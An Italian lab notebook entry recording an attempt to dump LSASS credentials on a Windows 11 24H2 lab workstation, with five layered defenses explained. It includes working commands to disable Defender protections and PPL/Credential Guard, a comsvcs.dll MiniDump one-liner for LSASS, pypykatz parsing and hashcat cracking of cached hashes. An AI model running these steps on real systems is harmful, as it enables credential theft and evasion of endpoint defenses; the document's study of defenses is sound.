# Lab Sessione 3 — Bypass LSASS su Windows 11 Enterprise

## Obiettivo della sessione

Riprodurre lo scenario di **HE7 p.196**: un admin (`bobadmin`) si collega via RDP a una workstation dove sta lavorando un utente normale (`alice`), poi si disconnette. Le credenziali dell'admin restano in LSASS della workstation. Un attaccante che compromette la workstation può estrarle.

Obiettivo concreto:

1. Costruire la scena (login + RDP + disconnect)
2. Dumpare LSASS con mimikatz
3. Trovare l'hash NTLM di `bobadmin` nell'output
4. Usarlo per **Pass-the-Hash** verso il DC

> [!warning] Spoiler Su **Windows 11 Enterprise 24H2** (build 26100), questo attacco "da manuale" non funziona out of the box. Ho incontrato **cinque difese stratificate** che bloccano mimikatz a livelli diversi. Questa nota documenta tutte e cinque, perché capirle è più importante che riuscire a girare il tool.

---

## Setup preliminare: SPICE Guest Tools via virtio-win

### Why

Senza SPICE vdagent installato nelle VM Windows, manca la clipboard host↔guest. Tutto il lavoro di copia-incolla di comandi PowerShell, hash, payload diventa friction inutile.

### Cosa ho usato

Non `spice-guest-tools-latest.exe` da spice-space.org (sito instabile), ma il pacchetto **virtio-win** ufficiale di Fedora. Stesso contenuto (driver VirtIO + SPICE vdagent + QXL + QEMU Guest Agent), maintained, firmato Red Hat.

> [!analogy] Linux parallel `virtio-win` sta a Windows guest come `qemu-guest-agent` + driver kernel paravirtualizzati stanno a un guest Linux su KVM. È il bundle "rendi il guest amichevole con l'hypervisor".

### Procedura

Su host Fedora:

```bash
sudo wget https://fedorapeople.org/groups/virt/virtio-win/virtio-win.repo \
    -O /etc/yum.repos.d/virtio-win.repo
sudo dnf install virtio-win
# ISO atterra in /usr/share/virtio-win/virtio-win.iso
```

In virt-manager, su ciascuna VM:

- Pre-flight check: verificare presenza di **Schermo Spice** + **Canale (spice)** con target `com.redhat.spice.0`
- Sostituire/aggiungere CDROM puntando a `/usr/share/virtio-win/virtio-win.iso`

Dentro Windows:

- Eseguire `virtio-win-guest-tools.exe` (NON `virtio-win-driver-installer` — quello mette solo i driver, senza vdagent)
- Installer fa tutto in un colpo: driver + SPICE vdagent + QEMU GA
- Riavviare il SO (riavvio normale, non cold boot)

Test: copia da host, incolla in Notepad guest. Done.

---

## Lo scenario costruito

```
Stato iniziale dopo setup:
┌─────────────────────────────┐    ┌────────────────────────────────┐
│ DC01 (Win Server 2022)      │    │ WS01 (Win 11 Enterprise 24H2)  │
│ 10.10.10.10                 │    │ 10.10.10.20                    │
│ Domain Controller corp.local│    │ Joined to corp.local           │
└─────────────────────────────┘    └────────────────────────────────┘

Azioni:
1. Login su WS01 come CORP\alice          → sessione "Interactive"
2. Da DC01, mstsc → 10.10.10.20           → sessione "RemoteInteractive"
   credenziali CORP\bobadmin
3. Disconnetto bobadmin (chiudo finestra) → sessione resta in memoria
4. (NON faccio logoff)                    → credenziali bobadmin in LSASS
```

**Differenza chiave disconnect vs logoff:**

|Azione|Effetto su LSASS|
|---|---|
|Disconnect|Sessione resta attiva, credenziali residenti|
|Logoff|Sessione terminata, credenziali ripulite|

Un admin frettoloso che chiude la finestra RDP invece di fare logoff = il regalo all'attaccante.

---

## Difese di Windows 11 incontrate (in ordine cronologico)

### Difesa 1 — RDP disabilitato di default

**Manifestazione:** `mstsc` da DC01 → `Remote Desktop can't connect to the remote computer`.

**Cause:**

1. Il servizio `TermService` rifiuta connessioni: registry `HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 1`
2. Le regole firewall del gruppo "Remote Desktop" sono disabled

**Bypass (legittimo, da admin locale):**

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
    -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

> [!warning] Gotcha incontrato Cambiare il registry NON basta: il servizio `TermService` deve essere riavviato per ricaricare la config. Ma `Restart-Service TermService` fallisce con "stop failed" se ci sono sessioni attive (anche la console SPICE conta). Soluzione: **GUI via `sysdm.cpl` → tab Remote → Allow remote connections**, oppure riavviare la VM. La GUI gestisce il restart del servizio in modo pulito bypassando il problema.

> [!analogy] Linux parallel Esatto stesso schema di SSH: hai `sshd` disabilitato (servizio non parte) **+** firewall che blocca 22/tcp. Devi sistemare entrambi. `fDenyTSConnections=1` è l'equivalente di `systemctl disable sshd`; le regole firewall sono l'equivalente di `firewall-cmd --remove-service=ssh`.

---

### Difesa 2 — Windows Defender + Tamper Protection

**Manifestazione:**

- Scarico `mimikatz_trunk.zip` da GitHub: Defender lo quarantena in download
- Estraggo l'eseguibile: viene eliminato
- Eseguo `Set-MpPreference -DisableRealtimeMonitoring $true` da PowerShell Admin: comando passa senza errori MA non ha effetto

**Causa profonda:** **Tamper Protection**.

> [!info] Tamper Protection (Windows 10 1903+, default attivo su Win11) Feature di Defender che impedisce a _qualunque_ meccanismo (PowerShell, GPO, registry, WMI) di modificare i settings di Defender stesso. È governata da un servizio kernel-mode (`MsSecCore.sys` + componenti) che ignora silenziosamente le modifiche dei `Set-MpPreference`. L'unico modo di disabilitarla è la GUI con conferma UAC interattiva. Esiste appositamente per impedire l'attacco "AV bypass via PowerShell Admin".

**Bypass:**

1. GUI: **Windows Security → Virus & threat protection → settings → Tamper Protection: Off** (richiede UAC)
2. Solo dopo, i comandi PowerShell hanno effetto:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath "C:\Tools"
```

> [!tip] Punto chiave didattico `-DisableRealtimeMonitoring` da solo NON basta. Defender ha più layer:
> 
> - **Real-time monitoring** — scansione on-access
> - **Behavior monitoring** — analisi comportamentale (detecta `sekurlsa::logonpasswords` per quello che fa, non per la signature)
> - **Cloud-delivered protection / Block at first seen** — submission a cloud per verdict
> - **IOAV** — scan dei file scaricati da internet zone
> 
> In un pentest reale, un attaccante NON disabilita Defender (Tamper Protection lo blocca). Usa AMSI bypass, in-memory execution, payload offuscati, BYOVD per killare il servizio Defender, o exclusion paths se già admin.

L'**ExclusionPath** è la chiave: file dentro `C:\Tools` non vengono scansionati indipendentemente dagli altri setting.

---

### Difesa 3 — PPL (Protected Process Light) su LSASS

**Manifestazione (mimikatz):**

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

`0x00000005` = `ERROR_ACCESS_DENIED`. Mimikatz ha ottenuto `SeDebugPrivilege` (il privilege::debug è OK) ma quando tenta `OpenProcess(lsass.exe, PROCESS_VM_READ)` Windows risponde no.

**Causa:** Il flag **PPL** sul processo `lsass.exe`.

> [!info] Protected Process Light (PPL) Estensione del meccanismo Protected Process (introdotto in Vista). Un processo PPL può essere debuggato/letto solo da altri processi PPL con un **livello di protezione pari o superiore**. Lo stato PPL è verificato dal kernel via la "Protected Signer" structure (PspProtectedProtectionInfo). Anche un processo SYSTEM con SeDebugPrivilege non può aprire un handle PROCESS_VM_READ a un processo PPL se non è esso stesso PPL con signer adatto.
> 
> Controllato da: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`
> 
> - `0` = LSASS è processo normale
> - `1` = LSASS è PPL
> - `2` = LSASS è PPL con UEFI lock (richiede modifica UEFI per disabilitare)
> 
> Default su Windows 11 22H2+: `RunAsPPL = 1`

**Bypass nel lab (admin locale + reboot):**

```powershell
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").RunAsPPL
# se 1 o 2:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "RunAsPPL" -Value 0
# reboot obbligatorio: PPL si imposta al boot
```

**Bypass nel mondo reale (senza accesso a registry+reboot):**

- **`!+` / `!processprotect /process:lsass.exe /remove`** dentro mimikatz: carica `mimidrv.sys` (driver firmato) che rimuove il flag PPL dal processo dal kernel. Funziona se il driver passa i check di Windows.
- **BYOVD (Bring Your Own Vulnerable Driver):** caricare un driver firmato vulnerabile noto (es. `RTCore64.sys`, `WinRing0`) per ottenere arbitrary kernel write e rimuovere il flag PPL.

---

### Difesa 4 — Credential Guard (VBS)

**Manifestazione (dopo bypass PPL):**

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

L'errore è diverso ora: mimikatz può **aprire** LSASS ma non trova la logon session list. Le credenziali non sono lì.

**Verifica:**

```powershell
Get-Process lsaiso
# Se ritorna un processo → Credential Guard attivo
```

> [!info] Credential Guard Una delle features di **Virtualization Based Security (VBS)**. Quando attiva:
> 
> - Windows lancia un mini-hypervisor (basato su Hyper-V) che crea due Virtual Trust Levels: VTL0 (normale Windows) e VTL1 (Secure Kernel)
> - Un processo isolato `LSAIso.exe` gira in VTL1, fuori dalla portata di qualsiasi processo VTL0 inclusi quelli SYSTEM
> - LSASS (in VTL0) delega le operazioni crittografiche su credenziali NTLM/Kerberos a `LSAIso.exe` via canale RPC sicuro
> - Risultato: gli **hash NTLM non esistono mai in memoria leggibile da userland**
> 
> Vedi: [[virtualization_based_security]]

**Bypass nel lab:**

```powershell
# I registry classici non bastano su Win11 24H2:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    -Name "EnableVirtualizationBasedSecurity" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "LsaCfgFlags" -Value 0

# Funziona davvero su 24H2:
bcdedit /set hypervisorlaunchtype off
# reboot
```

`bcdedit /set hypervisorlaunchtype off` è la chiave perché disabilita l'avvio dell'hypervisor VBS al boot. Senza hypervisor, non c'è VTL1, quindi `LsaIso.exe` non parte.

**Bypass nel mondo reale:** spesso impossibile senza:

- Accesso fisico per modificare UEFI/Secure Boot (se CG è UEFI-locked)
- GPO domain-wide se hai già DA
- Downgrade attack tramite vulnerabilità note

> [!warning] Insight importante CG + PPL combinati = mimikatz "classico" è morto su Windows 11 Enterprise moderno. Gli attacchi a LSASS oggi puntano a:
> 
> 1. **Sistemi legacy** dove CG/PPL non sono attivi (server vecchi, workstation non aggiornate)
> 2. **Dumping pre-Credential Guard** (file LSASS dump precedenti)
> 3. **Tecniche alternative**: Kerberoasting, AS-REP Roasting, abuse di ACL su AD, attacchi al certificato (ESC1-ESC15), DCSync se DA — che bypassano LSASS completamente
> 4. **Phishing e social engineering** — il fattore umano resta il punto debole

---

### Difesa 5 — Version mismatch mimikatz vs Windows 11 24H2

**Manifestazione (dopo bypass CG):**

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

Stesso identico errore di CG, ma `LsaIso.exe` non c'è più. Cosa succede?

**Causa:** mimikatz **2.2.0 #19041 Sep 19 2022** è compilato con offset hardcodati per la struttura interna di LSASS di **Windows 10 build 19041** (20H2). Il mio WS01 è **Windows 11 build 26100** (24H2): le strutture sono state ristrutturate da Microsoft, gli offset non corrispondono, mimikatz dereferenzia puntatori sbagliati e fallisce.

> [!tip] Perché succede Mimikatz parsa direttamente le strutture interne di LSASS — `KIWI_MSV1_0_LIST_*`, `KIWI_KERBEROS_LOGON_SESSION_*` etc — che NON sono API pubbliche. Microsoft non documenta questi layout, e li cambia tra build. Mimikatz mantiene una tabella di offset per ogni build supportata: se la build corrente non è nella tabella, fallisce.
> 
> La release ufficiale 2.2.0 non è stata aggiornata dopo settembre 2022. Per build recenti servono compilazioni dal branch `master` su GitHub.

**Bypass: cambio di approccio, dump + parse offline**

Invece di leggere LSASS in-memory, lo dumpo a file con un binario Windows legittimo, poi lo parso fuori:

```powershell
# Su WS01 (richiede admin)
$id = (Get-Process lsass).Id
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $id C:\Tools\lsass.dmp full
```

`comsvcs.dll` è una DLL di sistema Microsoft con una funzione esportata `MiniDump` che chiama internamente l'API `MiniDumpWriteDump`. Trick: Microsoft stessa fornisce un modo di dumpare LSASS. Defender lo detecta comunque (signature nota), ma con exclusion path funziona.

Poi su Kali/Fedora:

```bash
pipx install pypykatz
pypykatz lsa minidump lsass.dmp
```

**pypykatz** è una reimplementazione Python di mimikatz che mantiene attivamente il supporto per build recenti di Windows. Lavora su file dump (.dmp) — non ha bisogno di interagire con LSASS in vivo, quindi PPL/CG sono irrilevanti al momento del parse.

> [!info] Pattern reale Questo workflow (dump on-target → exfiltrate → parse offline) è **lo standard moderno** per credential dumping:
> 
> 1. Sul target lasci meno tracce possibili
> 2. L'analisi offline è più flessibile (puoi provare più tool, più versioni)
> 3. Il dump può essere conservato e ri-analizzato in futuro
> 4. Permette di separare i ruoli del team: chi accede, chi analizza

---

## Osservazione live: DCC2 in azione

Durante il setup ho avuto un momento di insight collaterale. Mentre DC01 stava ancora bootando (Windows in fase di startup), ho fatto il login su WS01 come `CORP\alice`. **Ha funzionato**, nonostante il DC non fosse raggiungibile.

Questo è il meccanismo dei **Domain Cached Credentials (DCC2)** osservato dal vivo: vedi [[credential_dumping_lsa_vs_lsass]].

```
Quando alice si è loggata la prima volta su WS01 (con DC up):
  → Windows ha verificato le credenziali via Kerberos col DC
  → Ha salvato un hash DCC2 della password in HKLM\SECURITY\Cache
  → Default: ultimi 10 utenti

Quando alice si rilogga (con DC down):
  → Windows trova l'entry DCC2 di alice
  → Hasha la password digitata con lo stesso algoritmo
  → Compara con l'hash cached
  → Login OK
```

Config:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  CachedLogonsCount = 10  (default)
  CachedLogonsCount = 0   → disabilita la cache, niente offline login
```

**Perché conta per l'attacco:** se compromesso WS01 ma DC non raggiungibile, posso comunque estrarre gli hash DCC2 di tutti gli utenti che si sono loggati lì recentemente. Si crackano con hashcat (PBKDF2-based, slow ma fattibile):

```bash
hashcat -m 2100 dcc2_hashes.txt rockyou.txt
```

---

## Cosa avresti visto (output di riferimento)

Visto che nessuno di questi tool ha completato l'attacco con successo, ecco gli output che avremmo visto se PPL/CG/version-mismatch non fossero stati in mezzo.

### LSASS dump (mimikatz / pypykatz format)

```
Authentication Id : 0 ; 521674 (00000000:0007f5ca)
Session           : RemoteInteractive from 2
User Name         : bobadmin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 5/17/2026 12:35:12 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1106
        msv :
         [00000003] Primary
         * Username : bobadmin
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e0fba38268d0ec66ef1cb452d5885e53d5f8d1f3
        wdigest :
         * Username : bobadmin
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : bobadmin
         * Domain   : CORP.LOCAL
         * Password : (null)
```

Cosa guardare:

|Campo|Significato|
|---|---|
|`Session: RemoteInteractive`|È una sessione RDP (vs `Interactive` per console, `Service` per servizi)|
|`msv NTLM`|**L'oro**: hash NTLM per Pass-the-Hash|
|`wdigest Password: (null)`|Su Windows moderni il WDigest non memorizza più cleartext. Pre-2014 vedevi la password in chiaro|
|`kerberos Password: (null)`|Idem. Quello che invece puoi trovare sono i TGT per Pass-the-Ticket|

### LSA Secrets + SAM + DCC2 (impacket-secretsdump format)

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/alice:$DCC2$10240#alice#7f4e6e7a6b2c3d4e5f6a7b8c9d0e1f2a
CORP.LOCAL/bobadmin:$DCC2$10240#bobadmin#a1b2c3d4e5f6789abcdef0123456789a

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\DC01$:plain:8c9d...e2f1

[*] DPAPI_SYSTEM 
dpapi_machinekey:0xabc123...
```

|Sezione|Cosa è|Dove sta|
|---|---|---|
|**SAM hashes**|Account locali della macchina|`HKLM\SAM`|
|**DCC2**|Cache ultimi 10 login di dominio|`HKLM\SECURITY\Cache`|
|**LSA Secrets**|Password service account, machine account, altri segreti|`HKLM\SECURITY\Policy\Secrets`|
|**DPAPI_SYSTEM**|Master key per decifrare credential blob DPAPI|LSA Secrets, ma trattato a parte|

Il punto del libro **HE7 p.196**: in **LSA Secrets** ci finiscono in chiaro le password dei service account di dominio. Nel mio lab, se `sqlsvc` girasse come servizio su WS01, qui troverei la sua password in chiaro.

---

## Mappa delle difese vs mimikatz "classico"

|Difesa|Livello|Errore mimikatz|Bypass lab|Bypass real-world|
|---|---|---|---|---|
|RDP disabled|App|(RDP non si connette)|GUI sysdm.cpl|N/A (precondizione)|
|Defender real-time|Userland|File quarantined|Tamper Off → exclusion|AMSI bypass, in-memory exec|
|PPL su LSASS|Kernel|`Handle on memory (0x5)`|Registry + reboot|BYOVD, mimidrv|
|Credential Guard|VBS/Kernel|`Logon list`|`bcdedit hypervisorlaunchtype off`|Spesso impossibile|
|Version mismatch|App|`Logon list`|Tool alternativo (pypykatz)|Tool alternativo (pypykatz)|

---

## Takeaways

1. **Mimikatz da release ufficiale (2.2.0, 2022) non funziona out of the box su Windows 11 Enterprise 24H2.** Servono compilazioni recenti, oppure pypykatz, oppure approccio dump-and-parse.
    
2. **Il modello mentale del libro è corretto, le difese sono nuove.** HE7 è del 2012 — la teoria (sessioni interattive lasciano hash in LSASS) è ancora vera, ma negli ultimi 12 anni Microsoft ha aggiunto PPL, Credential Guard, Tamper Protection, AMSI, ETW per Defender, ASR rules, Smart App Control. Il pentester moderno deve conoscere ognuno di questi.
    
3. **L'approccio dump+parse offline è oggi lo standard.** `comsvcs.dll MiniDump` + pypykatz è più resiliente e meno detectable di mimikatz in-memory.
    
4. **Per studiare le basi senza friction continua, Windows 10 (qualsiasi build pre-22H2 con PPL off) è didatticamente migliore.** Windows 11 Enterprise è ostile per design — il lab serve a _capire le difese_, non a riprodurre HE7 letteralmente.
    
5. **DCC2 osservato dal vivo è un'epifania.** L'ho vissuto involontariamente loggandomi a DC giù. Adesso so esattamente perché esistono i Domain Cached Credentials e perché sono un vettore di attacco.
    

---

## Da fare nelle prossime sessioni

Step originali del lab spostati:

- [ ] **Step 2 alternativo:** dump LSASS con `comsvcs.dll`, parse con pypykatz da Kali/Fedora — verifica end-to-end del workflow moderno
- [ ] **Step 3:** Pass-the-Hash da Kali (netexec) verso il DC con l'hash di bobadmin (servirà dump funzionante)
- [ ] **Step 4:** Kerberoasting su `sqlsvc` — non passa da LSASS, dovrebbe funzionare senza problemi su Win11
- [ ] **Step 5:** `impacket-secretsdump` contro il DC (richiede credenziali DA, ottenute via PtH o Kerberoasting)
- [ ] **Step 6:** DCSync

Argomenti teorici da approfondire (sequenza ragionata per capire Windows enterprise):

1. **SMB a fondo** — protocollo, autenticazione, named pipes, RPC over SMB
2. **DCE-RPC** — come i servizi Windows parlano tra loro
3. **LDAP + schema AD** — base per Bloodhound, enumerazione
4. **Kerberos in dettaglio** — TGT/TGS, golden/silver ticket, S4U, delegation
5. **GPO + WMI** — come le policy si propagano, persistence vectors

---

## Wiki-links

- [[lab_active_directory_fedora]] — la guida iniziale del lab
- [[credential_dumping_lsa_vs_lsass]] — distinzione LSA Secrets vs LSASS memory
- [[virtualization_based_security]] — VBS, HVCI, Credential Guard in dettaglio
- [[interactive_logon]] — modello di logon Windows
- [[windows_domain_logon]] — flow di autenticazione di dominio